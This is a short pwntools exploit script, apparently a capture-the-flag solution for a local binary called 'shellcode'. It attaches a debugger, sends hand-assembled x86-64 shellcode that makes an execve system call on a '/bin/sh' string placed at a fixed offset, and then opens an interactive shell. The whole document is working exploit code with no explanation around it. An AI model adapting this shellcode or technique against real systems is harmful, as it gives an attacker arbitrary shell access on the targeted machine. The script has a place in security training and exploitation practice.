#!/usr/bin/python3
from pwn import *
context.binary = exe = ELF("./shellcode")

def GDB():
    gdb.attach(p,gdbscript='''
    b* main +208
    c
    ''')
    input()
p = process(exe.path)
GDB()

payload = b"\x50\x5F\x48\x83\xC0\x00\x40\x80\xC7\x50\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\x34\x3B\x0F\x05"
payload = payload.ljust(0x50,b"\x00")
payload += b"/bin/sh\x00"
p.sendline(payload)
p.interactive()